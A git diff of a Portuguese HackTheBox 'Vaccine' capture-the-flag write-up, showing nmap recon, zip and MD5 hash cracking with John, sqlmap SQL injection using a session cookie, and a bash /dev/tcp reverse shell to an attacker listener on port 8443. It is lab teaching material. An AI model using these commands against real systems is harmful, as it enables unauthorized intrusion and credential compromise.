@@ -25,7 +25,7 @@ alt: "HTB Vaccine Writeup"
 ## RECON
 
 ### Nmap
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Vaccine]
 └─$ sudo nmap -v -p- -sCV -O -Pn 10.10.10.46 --min-rate=512
 PORT   STATE SERVICE VERSION
@@ -73,7 +73,7 @@ O arquivo está protegido por senha, as tentativas de reutilizar as senhas que j
 
 Podemos extrair a hash do arquivo e tentar quebrá-la, para isso vamos utilizar o `zip2john`.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Vaccine]
 └─$ zip2john backup.zip > hash                                                                                                                                                                                                          82 ⨯
 ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06
@@ -85,7 +85,7 @@ option -o to pick a file at a time.
 
 Com a hash em mãos, podemos utilizar o próprio `John` para tentar quebrá-la com a wordlist `rockyou.txt`.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Vaccine]
 └─$ john hash -wordlist=/usr/share/wordlists/rockyou.txt 
 Using default input encoding: UTF-8
@@ -100,7 +100,7 @@ Session completed
 
 Encontramos a sena `741852963`, vamos descompactar o arquivo e enumerar seu conteúdo.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Vaccine]
 └─$ unzip backup.zip 
 Archive:  backup.zip
@@ -120,7 +120,7 @@ drwxr-xr-x 31 hastur hastur 4096 Sep  6 20:54 ..
 ```
 Temos 2 arquivos, um index.php e uma folha css, vamos checar o conteúdo de index.php.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Vaccine]
 └─$ cat index.php 
 <!DOCTYPE html>
@@ -139,7 +139,7 @@ Encontramos uma função que compara a senha criptografada em `MD5` inserida, co
 
 Podemos salvar esta hash em um novo arquivo, e tentar quebrá-la novamente com o `John`.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Vaccine]
 └─$ echo '2cb42f8734ea607eefed3b70af13bbd3' > hashZip
                                                                                                                                                                                                                                              
@@ -172,7 +172,7 @@ Ao pressionar `F12` no navegador, no meu caso `Firefox`, vemos a barra de inspe�
 
 Temos o cooke `PHPSESSID=u8mds2v44ve1kglnmg8s6l90d6`, vamos utilizar o `sqlmap` para testar SQLi.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Vaccine]
 └─$ sqlmap -u 'http://10.10.10.46/dashboard.php?search=hastur' --cookie='PHPSESSID=u8mds2v44ve1kglnmg8s6l90d6'
         ___
@@ -241,7 +241,7 @@ back-end DBMS: PostgreSQL
 
 Podemos tentar um reverse shell com o próprio sqlmap, inserindo o parâmetro `--os-shell` na mesma requisição que fizemos.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Vaccine]
 └─$ sqlmap -u 'http://10.10.10.46/dashboard.php?search=hastur' --cookie='PHPSESSID=u8mds2v44ve1kglnmg8s6l90d6' --os-shell
         ___
@@ -321,7 +321,7 @@ Conseguimos um shell com o usuário `postgres`!!!
 
 Podemos melhorar este shell com um reverse shell utilizando o netcat, vamos seter um netcat na porta 8443 e enviar um payload.
 
-```
+```bash
 os-shell> bash -c 'bash -i >& /dev/tcp/10.10.15.185/8443 0>&1'
 do you want to retrieve the command standard output? [Y/n/a] n
 [21:55:24] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
@@ -336,7 +336,7 @@ Esta máquina não possui a flag `user.txt`, então precisamos escalar privilég
 
 Após enumerar vários diretórios, encontrei a senha do user `postgres`, dentro do arquivo `dashboard.php` no diretório `/var/www/html`.
 
-```
+```bash
 postgres@vaccine:/var/www/html$ cat dashboard.php
 cat dashboard.php
 <!DOCTYPE html>
